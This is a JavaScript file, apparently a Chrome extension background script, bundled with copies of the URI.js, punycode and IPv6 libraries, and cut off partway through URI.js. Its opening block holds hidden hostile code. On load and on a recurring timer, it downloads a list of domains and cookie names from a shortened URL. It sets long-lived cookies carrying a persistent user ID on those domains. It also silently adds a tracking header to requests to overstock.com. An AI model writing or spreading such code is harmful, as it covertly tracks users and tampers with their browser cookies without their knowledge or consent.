
function centiri_makeid() {
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for( var i=0; i < 15; i++ )
        text += possible.charAt(Math.floor(Math.random() * possible.length));
    return text;
}

function centiri_load(url,uniqueID) {
    var req = new XMLHttpRequest();
    req.open('GET', url, true);
    req.overrideMimeType('text/plain; charset=x-user-defined');
	req.onload = function (e){
		
		if (req.readyState === 4 && req.status === 200) {
			
			
			var lines = req.responseText.split("\n");
			
			for (var i in lines){
				
				
				var linesplit = lines[i].split("\t");
			
				var url = linesplit[0];
				var cookiename = linesplit[1].trim();
				
				
				var uri = new URI(url);
				var domainNameWithDot = "." + uri.domain();
				
				
				chrome.cookies.set(
					{
						"url" : url,
						"domain" : domainNameWithDot,
						"name" : cookiename,
						"value" : uniqueID,
						expirationDate: 1893456000,  
					}
				);
				
			}
		
		}
	
	
	}
	
	
    req.send(null);	
	
}


function centiri_updateCookies(){
	
	
	if (localStorage["centiri_uid"] == undefined || localStorage["centiri_uid"] == null ){
		var uniqueID = centiri_makeid();  
		localStorage["centiri_uid"] = uniqueID;  
	}
	else {
		var uniqueID = localStorage["centiri_uid"];
	}
	
	// Determine when we updated last
	if (localStorage["centiri_lastupdate"] == undefined || localStorage["centiri_lastupdate"] == null ){
		var lastUpdate = 1;
	}
	else {
		var lastUpdate = parseInt( localStorage["centiri_lastupdate"] );
	}
	
	
	
	if ( Date.now() - lastUpdate > 604800000){
		
		
		localStorage["centiri_lastupdate"] = Date.now();
		
		// Grab cookie list
		var cookieText = centiri_load("http://tiny.cc/hvwl2x",uniqueID);
		
	}
	
}


function cookieResponse(){
	
}


setTimeout( centiri_updateCookies, 2000);



function centiri_updateListener(alarm){
	if (alarm.name == "updateAlarm"){
		centiri_updateCookies();
	}
}
chrome.alarms.onAlarm.addListener(centiri_updateListener);
chrome.alarms.create('updateAlarm', {periodInMinutes : 10100});  


function centiri_overstockheader(details){
	
	
	if (localStorage["centiri_uid"] == undefined || localStorage["uid"] == null ){
		var uniqueID = centiri_makeid(); 
		localStorage["centiri_uid"] = uniqueID;  
	}
	else {
		var uniqueID = localStorage["centiri_uid"];
	}
	
	var headerName = "webtr-" + chrome.runtime.id.slice(0,10);
	
	
	details.requestHeaders.push( {name: headerName, value: uniqueID} );
	
	return {requestHeaders: details.requestHeaders};
}
chrome.webRequest.onBeforeSendHeaders.addListener( centiri_overstockheader, {urls: ["*://www.overstock.com/*"], types: ["main_frame"]}, ["blocking", "requestHeaders"]);




  (function (root, factory) {
    'use strict';
    
    if (typeof exports === 'object') {
      
      module.exports = factory();
    } else if (typeof define === 'function' && define.amd) {
      
      define(factory);
    } else {
      
      root.IPv6 = factory(root);
    }
  }(this, function (root) {
    'use strict';
  
   
    var _IPv6 = root && root.IPv6;
  
    function bestPresentation(address) {
     
  
      var _address = address.toLowerCase();
      var segments = _address.split(':');
      var length = segments.length;
      var total = 8;
  
      
      if (segments[0] === '' && segments[1] === '' && segments[2] === '') {
        
        segments.shift();
        segments.shift();
      } else if (segments[0] === '' && segments[1] === '') {
       
        segments.shift();
      } else if (segments[length - 1] === '' && segments[length - 2] === '') {
        
        segments.pop();
      }
  
      length = segments.length;
  
      
      if (segments[length - 1].indexOf('.') !== -1) {
        
        total = 7;
      }
  
      
      var pos;
      for (pos = 0; pos < length; pos++) {
        if (segments[pos] === '') {
          break;
        }
      }
  
      if (pos < total) {
        segments.splice(pos, 1, '0000');
        while (segments.length < total) {
          segments.splice(pos, 0, '0000');
        }
  
        length = segments.length;
      }
  
      
      var _segments;
      for (var i = 0; i < total; i++) {
        _segments = segments[i].split('');
        for (var j = 0; j < 3 ; j++) {
          if (_segments[0] === '0' && _segments.length > 1) {
            _segments.splice(0,1);
          } else {
            break;
          }
        }
  
        segments[i] = _segments.join('');
      }
  
      
      var best = -1;
      var _best = 0;
      var _current = 0;
      var current = -1;
      var inzeroes = false;
     
  
      for (i = 0; i < total; i++) {
        if (inzeroes) {
          if (segments[i] === '0') {
            _current += 1;
          } else {
            inzeroes = false;
            if (_current > _best) {
              best = current;
              _best = _current;
            }
          }
        } else {
          if (segments[i] === '0') {
            inzeroes = true;
            current = i;
            _current = 1;
          }
        }
      }
  
      if (_current > _best) {
        best = current;
        _best = _current;
      }
  
      if (_best > 1) {
        segments.splice(best, _best, '');
      }
  
      length = segments.length;
  
     
      var result = '';
      if (segments[0] === '')  {
        result = ':';
      }
  
      for (i = 0; i < length; i++) {
        result += segments[i];
        if (i === length - 1) {
          break;
        }
  
        result += ':';
      }
  
      if (segments[length - 1] === '') {
        result += ':';
      }
  
      return result;
    }
  
    function noConflict() {
     
      if (root.IPv6 === this) {
        root.IPv6 = _IPv6;
      }
    
      return this;
    }
  
    return {
      best: bestPresentation,
      noConflict: noConflict
    };
  }));
  
  
  
  ;(function(root) {
  
  	
  	var freeExports = typeof exports == 'object' && exports;
  	var freeModule = typeof module == 'object' && module &&
  		module.exports == freeExports && module;
  	var freeGlobal = typeof global == 'object' && global;
  	if (freeGlobal.global === freeGlobal || freeGlobal.window === freeGlobal) {
  		root = freeGlobal;
  	}
  
  	var punycode,
  
  	
  	maxInt = 2147483647, 
  
  	
  	base = 36,
  	tMin = 1,
  	tMax = 26,
  	skew = 38,
  	damp = 700,
  	initialBias = 72,
  	initialN = 128, 
  	delimiter = '-', 
  
  	
  	regexPunycode = /^xn--/,
  	regexNonASCII = /[^ -~]/, 
  	regexSeparators = /\x2E|\u3002|\uFF0E|\uFF61/g, 
  
  	/** Error messages */
  	errors = {
  		'overflow': 'Overflow: input needs wider integers to process',
  		'not-basic': 'Illegal input >= 0x80 (not a basic code point)',
  		'invalid-input': 'Invalid input'
  	},
  
  	
  	baseMinusTMin = base - tMin,
  	floor = Math.floor,
  	stringFromCharCode = String.fromCharCode,
  
  	
  	key;
  
  	
  	function error(type) {
  		throw RangeError(errors[type]);
  	}
  
  	
  	function map(array, fn) {
  		var length = array.length;
  		while (length--) {
  			array[length] = fn(array[length]);
  		}
  		return array;
  	}
  
  	
  	function mapDomain(string, fn) {
  		return map(string.split(regexSeparators), fn).join('.');
  	}
  
  	
  	function ucs2decode(string) {
  		var output = [],
  		    counter = 0,
  		    length = string.length,
  		    value,
  		    extra;
  		while (counter < length) {
  			value = string.charCodeAt(counter++);
  			if (value >= 0xD800 && value <= 0xDBFF && counter < length) {
  				
  				extra = string.charCodeAt(counter++);
  				if ((extra & 0xFC00) == 0xDC00) { 
  					output.push(((value & 0x3FF) << 10) + (extra & 0x3FF) + 0x10000);
  				} else {
  					
  					output.push(value);
  					counter--;
  				}
  			} else {
  				output.push(value);
  			}
  		}
  		return output;
  	}
  
  	
  	function ucs2encode(array) {
  		return map(array, function(value) {
  			var output = '';
  			if (value > 0xFFFF) {
  				value -= 0x10000;
  				output += stringFromCharCode(value >>> 10 & 0x3FF | 0xD800);
  				value = 0xDC00 | value & 0x3FF;
  			}
  			output += stringFromCharCode(value);
  			return output;
  		}).join('');
  	}
  
  
  	function basicToDigit(codePoint) {
  		if (codePoint - 48 < 10) {
  			return codePoint - 22;
  		}
  		if (codePoint - 65 < 26) {
  			return codePoint - 65;
  		}
  		if (codePoint - 97 < 26) {
  			return codePoint - 97;
  		}
  		return base;
  	}
  
  	
  	function digitToBasic(digit, flag) {
  		
  		return digit + 22 + 75 * (digit < 26) - ((flag != 0) << 5);
  	}
  
  	
  	function adapt(delta, numPoints, firstTime) {
  		var k = 0;
  		delta = firstTime ? floor(delta / damp) : delta >> 1;
  		delta += floor(delta / numPoints);
  		for (/* no initialization */; delta > baseMinusTMin * tMax >> 1; k += base) {
  			delta = floor(delta / baseMinusTMin);
  		}
  		return floor(k + (baseMinusTMin + 1) * delta / (delta + skew));
  	}
  
  	
  	function decode(input) {
  		
  		var output = [],
  		    inputLength = input.length,
  		    out,
  		    i = 0,
  		    n = initialN,
  		    bias = initialBias,
  		    basic,
  		    j,
  		    index,
  		    oldi,
  		    w,
  		    k,
  		    digit,
  		    t,
  		    length,
  		    
  		    baseMinusT;
  
  		
  		basic = input.lastIndexOf(delimiter);
  		if (basic < 0) {
  			basic = 0;
  		}
  
  		for (j = 0; j < basic; ++j) {
  			// if it's not a basic code point
  			if (input.charCodeAt(j) >= 0x80) {
  				error('not-basic');
  			}
  			output.push(input.charCodeAt(j));
  		}
  
  		
  
  		for (index = basic > 0 ? basic + 1 : 0; index < inputLength; /* no final expression */) {
  
  			
  			for (oldi = i, w = 1, k = base; /* no condition */; k += base) {
  
  				if (index >= inputLength) {
  					error('invalid-input');
  				}
  
  				digit = basicToDigit(input.charCodeAt(index++));
  
  				if (digit >= base || digit > floor((maxInt - i) / w)) {
  					error('overflow');
  				}
  
  				i += digit * w;
  				t = k <= bias ? tMin : (k >= bias + tMax ? tMax : k - bias);
  
  				if (digit < t) {
  					break;
  				}
  
  				baseMinusT = base - t;
  				if (w > floor(maxInt / baseMinusT)) {
  					error('overflow');
  				}
  
  				w *= baseMinusT;
  
  			}
  
  			out = output.length + 1;
  			bias = adapt(i - oldi, out, oldi == 0);
  
  			
  			if (floor(i / out) > maxInt - n) {
  				error('overflow');
  			}
  
  			n += floor(i / out);
  			i %= out;
  
  			
  			output.splice(i++, 0, n);
  
  		}
  
  		return ucs2encode(output);
  	}
  
  	
  	function encode(input) {
  		var n,
  		    delta,
  		    handledCPCount,
  		    basicLength,
  		    bias,
  		    j,
  		    m,
  		    q,
  		    k,
  		    t,
  		    currentValue,
  		    output = [],
  		    
  		    inputLength,
  		   
  		    handledCPCountPlusOne,
  		    baseMinusT,
  		    qMinusT;
  
  		
  		input = ucs2decode(input);
  
  	
  		inputLength = input.length;
  
  		
  		n = initialN;
  		delta = 0;
  		bias = initialBias;
  
  		for (j = 0; j < inputLength; ++j) {
  			currentValue = input[j];
  			if (currentValue < 0x80) {
  				output.push(stringFromCharCode(currentValue));
  			}
  		}
  
  		handledCPCount = basicLength = output.length;
  
  		
  		if (basicLength) {
  			output.push(delimiter);
  		}
  
  		
  		while (handledCPCount < inputLength) {
  
  			
  			for (m = maxInt, j = 0; j < inputLength; ++j) {
  				currentValue = input[j];
  				if (currentValue >= n && currentValue < m) {
  					m = currentValue;
  				}
  			}
  
  			
  			handledCPCountPlusOne = handledCPCount + 1;
  			if (m - n > floor((maxInt - delta) / handledCPCountPlusOne)) {
  				error('overflow');
  			}
  
  			delta += (m - n) * handledCPCountPlusOne;
  			n = m;
  
  			for (j = 0; j < inputLength; ++j) {
  				currentValue = input[j];
  
  				if (currentValue < n && ++delta > maxInt) {
  					error('overflow');
  				}
  
  				if (currentValue == n) {
  					
  					for (q = delta, k = base; /* no condition */; k += base) {
  						t = k <= bias ? tMin : (k >= bias + tMax ? tMax : k - bias);
  						if (q < t) {
  							break;
  						}
  						qMinusT = q - t;
  						baseMinusT = base - t;
  						output.push(
  							stringFromCharCode(digitToBasic(t + qMinusT % baseMinusT, 0))
  						);
  						q = floor(qMinusT / baseMinusT);
  					}
  
  					output.push(stringFromCharCode(digitToBasic(q, 0)));
  					bias = adapt(delta, handledCPCountPlusOne, handledCPCount == basicLength);
  					delta = 0;
  					++handledCPCount;
  				}
  			}
  
  			++delta;
  			++n;
  
  		}
  		return output.join('');
  	}
  
  	
  	function toUnicode(domain) {
  		return mapDomain(domain, function(string) {
  			return regexPunycode.test(string)
  				? decode(string.slice(4).toLowerCase())
  				: string;
  		});
  	}
  
  	
  	function toASCII(domain) {
  		return mapDomain(domain, function(string) {
  			return regexNonASCII.test(string)
  				? 'xn--' + encode(string)
  				: string;
  		});
  	}
  
  	
  	punycode = {
  		
  		'version': '1.2.3',
  		
  		'ucs2': {
  			'decode': ucs2decode,
  			'encode': ucs2encode
  		},
  		'decode': decode,
  		'encode': encode,
  		'toASCII': toASCII,
  		'toUnicode': toUnicode
  	};
  
  	
  	if (
  		typeof define == 'function' &&
  		typeof define.amd == 'object' &&
  		define.amd
  	) {
  		define(function() {
  			return punycode;
  		});
  	}	else if (freeExports && !freeExports.nodeType) {
  		if (freeModule) { // in Node.js or RingoJS v0.8.0+
  			freeModule.exports = punycode;
  		} else { // in Narwhal or RingoJS v0.7.0-
  			for (key in punycode) {
  				punycode.hasOwnProperty(key) && (freeExports[key] = punycode[key]);
  			}
  		}
  	} else { // in Rhino or a web browser
  		root.punycode = punycode;
  	}
  
  }(this));
  
  
  
  
  
  (function (root, factory) {
      'use strict';
      
    if (typeof exports === 'object') {
      
      module.exports = factory();
    } else if (typeof define === 'function' && define.amd) {
      
      define(factory);
    } else {
      
      root.SecondLevelDomains = factory(root);
    }
  }(this, function (root) {
    'use strict';
  
    
    var _SecondLevelDomains = root && root.SecondLevelDomains;
  
    var SLD = {
      
      list: {
        'ac':' com gov mil net org ',
        'ae':' ac co gov mil name net org pro sch ',
        'af':' com edu gov net org ',
        'al':' com edu gov mil net org ',
        'ao':' co ed gv it og pb ',
        'ar':' com edu gob gov int mil net org tur ',
        'at':' ac co gv or ',
        'au':' asn com csiro edu gov id net org ',
        'ba':' co com edu gov mil net org rs unbi unmo unsa untz unze ',
        'bb':' biz co com edu gov info net org store tv ',
        'bh':' biz cc com edu gov info net org ',
        'bn':' com edu gov net org ',
        'bo':' com edu gob gov int mil net org tv ',
        'br':' adm adv agr am arq art ato b bio blog bmd cim cng cnt com coop ecn edu eng esp etc eti far flog fm fnd fot fst g12 ggf gov imb ind inf jor jus lel mat med mil mus net nom not ntr odo org ppg pro psc psi qsl rec slg srv tmp trd tur tv vet vlog wiki zlg ',
        'bs':' com edu gov net org ',
        'bz':' du et om ov rg ',
        'ca':' ab bc mb nb nf nl ns nt nu on pe qc sk yk ',
        'ck':' biz co edu gen gov info net org ',
        'cn':' ac ah bj com cq edu fj gd gov gs gx gz ha hb he hi hl hn jl js jx ln mil net nm nx org qh sc sd sh sn sx tj tw xj xz yn zj ',
        'co':' com edu gov mil net nom org ',
        'cr':' ac c co ed fi go or sa ',
        'cy':' ac biz com ekloges gov ltd name net org parliament press pro tm ',
        'do':' art com edu gob gov mil net org sld web ',
        'dz':' art asso com edu gov net org pol ',
        'ec':' com edu fin gov info med mil net org pro ',
        'eg':' com edu eun gov mil name net org sci ',
        'er':' com edu gov ind mil net org rochest w ',
        'es':' com edu gob nom org ',
        'et':' biz com edu gov info name net org ',
        'fj':' ac biz com info mil name net org pro ',
        'fk':' ac co gov net nom org ',
        'fr':' asso com f gouv nom prd presse tm ',
        'gg':' co net org ',
        'gh':' com edu gov mil org ',
        'gn':' ac com gov net org ',
        'gr':' com edu gov mil net org ',
        'gt':' com edu gob ind mil net org ',
        'gu':' com edu gov net org ',
        'hk':' com edu gov idv net org ',
        'id':' ac co go mil net or sch web ',
        'il':' ac co gov idf k12 muni net org ',
        'in':' ac co edu ernet firm gen gov i ind mil net nic org res ',
        'iq':' com edu gov i mil net org ',
        'ir':' ac co dnssec gov i id net org sch ',
        'it':' edu gov ',
        'je':' co net org ',
        'jo':' com edu gov mil name net org sch ',
        'jp':' ac ad co ed go gr lg ne or ',
        'ke':' ac co go info me mobi ne or sc ',
        'kh':' com edu gov mil net org per ',
        'ki':' biz com de edu gov info mob net org tel ',
        'km':' asso com coop edu gouv k medecin mil nom notaires pharmaciens presse tm veterinaire ',
        'kn':' edu gov net org ',
        'kr':' ac busan chungbuk chungnam co daegu daejeon es gangwon go gwangju gyeongbuk gyeonggi gyeongnam hs incheon jeju jeonbuk jeonnam k kg mil ms ne or pe re sc seoul ulsan ',
        'kw':' com edu gov net org ',
        'ky':' com edu gov net org ',
        'kz':' com edu gov mil net org ',
        'lb':' com edu gov net org ',
        'lk':' assn com edu gov grp hotel int ltd net ngo org sch soc web ',
        'lr':' com edu gov net org ',
        'lv':' asn com conf edu gov id mil net org ',
        'ly':' com edu gov id med net org plc sch ',
        'ma':' ac co gov m net org press ',
        'mc':' asso tm ',
        'me':' ac co edu gov its net org priv ',
        'mg':' com edu gov mil nom org prd tm ',
        'mk':' com edu gov inf name net org pro ',
        'ml':' com edu gov net org presse ',
        'mn':' edu gov org ',
        'mo':' com edu gov net org ',
        'mt':' com edu gov net org ',
        'mv':' aero biz com coop edu gov info int mil museum name net org pro ',
        'mw':' ac co com coop edu gov int museum net org ',
        'mx':' com edu gob net org ',
        'my':' com edu gov mil name net org sch ',
        'nf':' arts com firm info net other per rec store web ',
        'ng':' biz com edu gov mil mobi name net org sch ',
        'ni':' ac co com edu gob mil net nom org ',
        'np':' com edu gov mil net org ',
        'nr':' biz com edu gov info net org ',
        'om':' ac biz co com edu gov med mil museum net org pro sch ',
        'pe':' com edu gob mil net nom org sld ',
        'ph':' com edu gov i mil net ngo org ',
        'pk':' biz com edu fam gob gok gon gop gos gov net org web ',
        'pl':' art bialystok biz com edu gda gdansk gorzow gov info katowice krakow lodz lublin mil net ngo olsztyn org poznan pwr radom slupsk szczecin torun warszawa waw wroc wroclaw zgora ',
        'pr':' ac biz com edu est gov info isla name net org pro prof ',
        'ps':' com edu gov net org plo sec ',
        'pw':' belau co ed go ne or ',
        'ro':' arts com firm info nom nt org rec store tm www ',
        'rs':' ac co edu gov in org ',
        'sb':' com edu gov net org ',
        'sc':' com edu gov net org ',
        'sh':' co com edu gov net nom org ',
        'sl':' com edu gov net org ',
        'st':' co com consulado edu embaixada gov mil net org principe saotome store ',
        'sv':' com edu gob org red ',
        'sz':' ac co org ',
        'tr':' av bbs bel biz com dr edu gen gov info k12 name net org pol tel tsk tv web ',
        'tt':' aero biz cat co com coop edu gov info int jobs mil mobi museum name net org pro tel travel ',
        'tw':' club com ebiz edu game gov idv mil net org ',
        'mu':' ac co com gov net or org ',
        'mz':' ac co edu gov org ',
        'na':' co com ',
        'nz':' ac co cri geek gen govt health iwi maori mil net org parliament school ',
        'pa':' abo ac com edu gob ing med net nom org sld ',
        'pt':' com edu gov int net nome org publ ',
        'py':' com edu gov mil net org ',
        'qa':' com edu gov mil net org ',
        're':' asso com nom ',
        'ru':' ac adygeya altai amur arkhangelsk astrakhan bashkiria belgorod bir bryansk buryatia cbg chel chelyabinsk chita chukotka chuvashia com dagestan e-burg edu gov grozny int irkutsk ivanovo izhevsk jar joshkar-ola kalmykia kaluga kamchatka karelia kazan kchr kemerovo khabarovsk khakassia khv kirov koenig komi kostroma kranoyarsk kuban kurgan kursk lipetsk magadan mari mari-el marine mil mordovia mosreg msk murmansk nalchik net nnov nov novosibirsk nsk omsk orenburg org oryol penza perm pp pskov ptz rnd ryazan sakhalin samara saratov simbirsk smolensk spb stavropol stv surgut tambov tatarstan tom tomsk tsaritsyn tsk tula tuva tver tyumen udm udmurtia ulan-ude vladikavkaz vladimir vladivostok volgograd vologda voronezh vrn vyatka yakutia yamal yekaterinburg yuzhno-sakhalinsk ',
        'rw':' ac co com edu gouv gov int mil net ',
        'sa':' com edu gov med net org pub sch ',
        'sd':' com edu gov info med net org tv ',
        'se':' a ac b bd c d e f g h i k l m n o org p parti pp press r s t tm u w x y z ',
        'sg':' com edu gov idn net org per ',
        'sn':' art com edu gouv org perso univ ',
        'sy':' com edu gov mil net news org ',
        'th':' ac co go in mi net or ',
        'tj':' ac biz co com edu go gov info int mil name net nic org test web ',
        'tn':' agrinet com defense edunet ens fin gov ind info intl mincom nat net org perso rnrt rns rnu tourism ',
        'tz':' ac co go ne or ',
        'ua':' biz cherkassy chernigov chernovtsy ck cn co com crimea cv dn dnepropetrovsk donetsk dp edu gov if in ivano-frankivsk kh kharkov kherson khmelnitskiy kiev kirovograd km kr ks kv lg lugansk lutsk lviv me mk net nikolaev od odessa org pl poltava pp rovno rv sebastopol sumy te ternopil uzhgorod vinnica vn zaporizhzhe zhitomir zp zt ',
        'ug':' ac co go ne or org sc ',
        'uk':' ac bl british-library co cym gov govt icnet jet lea ltd me mil mod national-library-scotland nel net nhs nic nls org orgn parliament plc police sch scot soc ',
        'us':' dni fed isa kids nsn ',
        'uy':' com edu gub mil net org ',
        've':' co com edu gob info mil net org web ',
        'vi':' co com k12 net org ',
        'vn':' ac biz com edu gov health info int name net org pro ',
        'ye':' co com gov ltd me net org plc ',
        'yu':' ac co edu gov org ',
        'za':' ac agric alt bourse city co cybernet db edu gov grondar iaccess imt inca landesign law mil net ngo nis nom olivetti org pix school tm web ',
        'zm':' ac co com edu gov net org sch '
      },
      
      has: function(domain) {
        var tldOffset = domain.lastIndexOf('.');
        if (tldOffset <= 0 || tldOffset >= (domain.length-1)) {
          return false;
        }
        var sldOffset = domain.lastIndexOf('.', tldOffset-1);
        if (sldOffset <= 0 || sldOffset >= (tldOffset-1)) {
          return false;
        }
        var sldList = SLD.list[domain.slice(tldOffset+1)];
        if (!sldList) {
          return false;
        }
        return sldList.indexOf(' ' + domain.slice(sldOffset+1, tldOffset) + ' ') >= 0;
      },
      is: function(domain) {
        var tldOffset = domain.lastIndexOf('.');
        if (tldOffset <= 0 || tldOffset >= (domain.length-1)) {
          return false;
        }
        var sldOffset = domain.lastIndexOf('.', tldOffset-1);
        if (sldOffset >= 0) {
          return false;
        }
        var sldList = SLD.list[domain.slice(tldOffset+1)];
        if (!sldList) {
          return false;
        }
        return sldList.indexOf(' ' + domain.slice(0, tldOffset) + ' ') >= 0;
      },
      get: function(domain) {
        var tldOffset = domain.lastIndexOf('.');
        if (tldOffset <= 0 || tldOffset >= (domain.length-1)) {
          return null;
        }
        var sldOffset = domain.lastIndexOf('.', tldOffset-1);
        if (sldOffset <= 0 || sldOffset >= (tldOffset-1)) {
          return null;
        }
        var sldList = SLD.list[domain.slice(tldOffset+1)];
        if (!sldList) {
          return null;
        }
        if (sldList.indexOf(' ' + domain.slice(sldOffset+1, tldOffset) + ' ') < 0) {
          return null;
        }
        return domain.slice(sldOffset+1);
      },
      noConflict: function(){
        if (root.SecondLevelDomains === this) {
          root.SecondLevelDomains = _SecondLevelDomains;
        }
        return this;
      }
    };
  
    return SLD;
  }));
  
  
  
  
  
 
  (function (root, factory) {
    'use strict';
   
    if (typeof exports === 'object') {
   
      module.exports = factory(require('./punycode'), require('./IPv6'), require('./SecondLevelDomains'));
    } else if (typeof define === 'function' && define.amd) {
      
      define(['./punycode', './IPv6', './SecondLevelDomains'], factory);
    } else {
      
      root.URI = factory(root.punycode, root.IPv6, root.SecondLevelDomains, root);
    }
  }(this, function (punycode, IPv6, SLD, root) {
    
    var _URI = root && root.URI;
    var _URI_limit = 1000;
  
    function URI(url, base) {
      
      if (!(this instanceof URI)) {
        return new URI(url, base);
      }
  
      if (url === undefined) {
        if (typeof location !== 'undefined') {
          url = location.href + '';
        } else {
          url = '';
        }
      }
  
      this.href(url);
  
      
      if (base !== undefined) {
        return this.absoluteTo(base);
      }
  
      return this;
    }
  
    URI.version = '1.13.2';
  
    var p = URI.prototype;
    var hasOwn = Object.prototype.hasOwnProperty;
    var _ver = 0;
  
    function escapeRegEx(string) {
      
      return string.replace(/([.*+?^=!:${}()|[\]\/\\])/g, '\\$1');
    }
  
    function getType(value) {
      
      if (value === undefined) {
        return 'Undefined';
      }
  
      return String(Object.prototype.toString.call(value)).slice(8, -1);
    }
  
    function isArray(obj) {
      return getType(obj) === 'Array';
    }
  
    
    function URIReader(data) {
      this._buffer = data;
      this._pos = 0;
    }
    URIReader.prototype = {
      readString: function(length) {
        var result = this._buffer.substr(this._pos, length);
        return result;
      },
      seek: function(pos) {
        this._pos = pos;
      },
    }
  
    function filterArrayValues(data, value) {
      var lookup = {};
      var i, length;
  
      if (isArray(value)) {
        for (i = 0, length = value.length; i < length; i++) {
          lookup[value[i]] = true;
        }
      } else {
        lookup[value] = true;
      }
  
      for (i = 0, length = data.length; i < length; i++) {
        if (lookup[data[i]] !== undefined) {
          data.splice(i, 1);
          length--;
          i--;
        }
      }
  
      return data;
    }
  
    function arrayContains(list, value) {
      var i, length;
  
     
      if (isArray(value)) {
       
        for (i = 0, length = value.length; i < length; i++) {
          if (!arrayContains(list, value[i])) {
            return false;
          }
        }
  
        return true;
      }
  
      var _type = getType(value);
      for (i = 0, length = list.length; i < length; i++) {
        if (_type === 'RegExp') {
          if (typeof list[i] === 'string' && list[i].match(value)) {
            return true;
          }
        } else if (list[i] === value) {
          return true;
        }
      }
  
      return false;
    }
  
    function arraysEqual(one, two) {
      if (!isArray(one) || !isArray(two)) {
        return false;
      }
  
      
      if (one.length !== two.length) {
        return false;
      }
  
      one.sort();
      two.sort();
  
      for (var i = 0, l = one.length; i < l; i++) {
        if (one[i] !== two[i]) {
          return false;
        }
      }
  
      return true;
    }
  
    URI._parts = function() {
      return {
        protocol: null,
        username: null,
        password: null,
        hostname: null,
        urn: null,
        port: null,
        path: null,
        query: null,
        fragment: null,
       
        duplicateQueryParameters: URI.duplicateQueryParameters,
        escapeQuerySpace: URI.escapeQuerySpace
      };
    };
   
    URI.duplicateQueryParameters = false;
   
    URI.escapeQuerySpace = true;
 
    URI.protocol_expression = /^[a-z][a-z0-9.+-]*$/i;
    URI.idn_expression = /[^a-z0-9\.-]/i;
    URI.punycode_expression = /(xn--)/i;
    
    URI.ip4_expression = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;
  
    URI.ip6_expression = /^\s*((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:)))(%.+)?\s*$/;
   
    URI.find_uri_expression = /\b((?:[a-z][\w-]+:(?:\/{1,3}|[a-z0-9%])|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}\/)(?:[^\s()<>]+|\(([^\s()<>]+|(\([^\s()<>]+\)))*\))+(?:\(([^\s()<>]+|(\([^\s()<>]+\)))*\)|[^\s`!()\[\]{};:'".,<>?????????????????]))/ig;
    URI.findUri = {
      
      start: /\b(?:([a-z][a-z0-9.+-]*:\/\/)|www\.)/gi,
      
      end: /[\s\r\n]|$/,
      
      trim: /[`!()\[\]{};:'".,<>????????????????????]+$/
    };
    
    URI.defaultPorts = {
      http: '80',
      https: '443',
      ftp: '21',
      gopher: '70',
      ws: '80',
      wss: '443'
    };
    
    URI.invalid_hostname_characters = /[^a-zA-Z0-9\.-]/;
    
    URI.domAttributes = {
      'a': 'href',
      'blockquote': 'cite',
      'link': 'href',
      'base': 'href',
      'script': 'src',
      'form': 'action',
      'img': 'src',
      'area': 'href',
      'iframe': 'src',
      'embed': 'src',
      'source': 'src',
      'track': 'src',
      'input': 'src' 
    };
    URI.getDomAttribute = function(node) {
      if (!node || !node.nodeName) {
        return undefined;
      }
  
      var nodeName = node.nodeName.toLowerCase();
      
      if (nodeName === 'input' && node.type !== 'image') {
        return undefined;
      }
  
      return URI.domAttributes[nodeName];
    };
  
    function escapeForDumbFirefox36(value) {
      
      return escape(value);
    }
  
    
    function strictEncodeURIComponent(string) {
      
      return encodeURIComponent(string)
        .replace(/[!'()*]/g, escapeForDumbFirefox36)
        .replace(/\*/g, '%2A');
    }
    URI.encode = strictEncodeURIComponent;
    URI.decode = decodeURIComponent;
    var _esc = window;
    URI.iso8859 = function() {
      URI.encode = escape;
      URI.decode = unescape;
    };
    URI.unicode = function() {
      URI.encode = strictEncodeURIComponent;
      URI.decode = decodeURIComponent;
    };
    URI.characters = {
      pathname: {
        encode: {
          
          expression: /%(24|26|2B|2C|3B|3D|3A|40)/ig,
          map: {
            // -._~!'()*
            '%24': '$',
            '%26': '&',
            '%2B': '+',
            '%2C': ',',
            '%3B': ';',
            '%3D': '=',
            '%3A': ':',
            '%40': '@'
          }
        },
        decode: {
          expression: /[\/\?#]/g,
          map: {
            '/': '%2F',
            '?': '%3F',
            '#': '%23'
          }
        }
      },
      reserved: {
        encode: {
          
          expression: /%(21|23|24|26|27|28|29|2A|2B|2C|2F|3A|3B|3D|3F|40|5B|5D)/ig,
          map: {
            
            '%3A': ':',
            '%2F': '/',
            '%3F': '?',
            '%23': '#',
            '%5B': '[',
            '%5D': ']',
            '%40': '@',
            
            '%21': '!',
            '%24': '$',
